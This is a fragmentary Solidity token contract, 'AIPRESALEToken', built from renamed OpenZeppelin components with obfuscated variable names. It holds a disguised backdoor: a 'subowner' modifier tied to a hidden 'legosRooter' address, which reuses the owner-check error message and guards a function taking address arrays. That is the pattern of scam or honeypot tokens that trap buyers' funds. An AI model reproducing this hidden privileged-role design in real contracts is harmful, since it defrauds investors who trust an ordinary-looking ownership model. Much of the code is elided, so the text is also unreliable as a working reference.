...
/*
 * @dev Provides information about the current execution AIPRESALE20Burnable, including the
 ...
 */
abstract contract AIPRESALE20Burnable {
...
// File: @openzeppelin/contracts/access/AIPRESALE20Ownable.sol
 ...
 * the owner.
 */
abstract contract AIPRESALE20Ownable is AIPRESALE20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AIPRESALE20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AIPRESALE20Ownable: new owner is the zero address");
 ...
 * `SafeAIPRESALE` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeAIPRESALE {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeAIPRESALE: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeAIPRESALE: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeAIPRESALE: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeAIPRESALE: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeAIPRESALE: modulo by zero");
  }
...
contract AIPRESALEToken is AIPRESALE20Burnable, AIPRESALEinterface, AIPRESALE20Ownable {
    
    using SafeAIPRESALE for uint256;
    ...
    */
    ...
    /**
    * @dev See {AIPRESALEinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {AIPRESALEinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "AIPRESALE20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {AIPRESALEinterface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {AIPRESALEinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {AIPRESALEinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {AIPRESALEinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {AIPRESALEinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "AIPRESALEinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {AIPRESALEinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "AIPRESALEinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "AIPRESALEinterface: transfer from the zero address");
        require(shippingto != address(0), "AIPRESALEinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "AIPRESALEinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "AIPRESALEinterface: approve from the zero address");
        require(transporteur != address(0), "AIPRESALEinterface: approve to the zero address");
